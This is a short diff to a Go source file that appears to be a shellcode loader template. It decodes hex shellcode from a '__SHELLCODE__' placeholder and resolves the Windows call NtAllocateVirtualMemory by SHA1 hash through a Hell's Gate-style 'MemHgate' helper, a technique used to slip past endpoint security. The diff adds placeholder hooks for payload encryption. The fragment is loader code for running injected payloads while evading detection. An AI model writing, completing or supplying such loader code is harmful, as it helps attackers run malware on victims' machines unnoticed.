@@ -8,12 +8,14 @@ import (
 	"fmt"
 	"syscall"
 	"unsafe"
+	//__ENCRYPTMODULE__
 )
 
 func main() {
 
 	// shellcode, _ := hex.DecodeString(code)
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
+	//__ENCRYPTCODE__
 	var thisThread = uintptr(0xffffffffffffffff)
 
 	myNtAllocateVirtualMemory, err := external.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
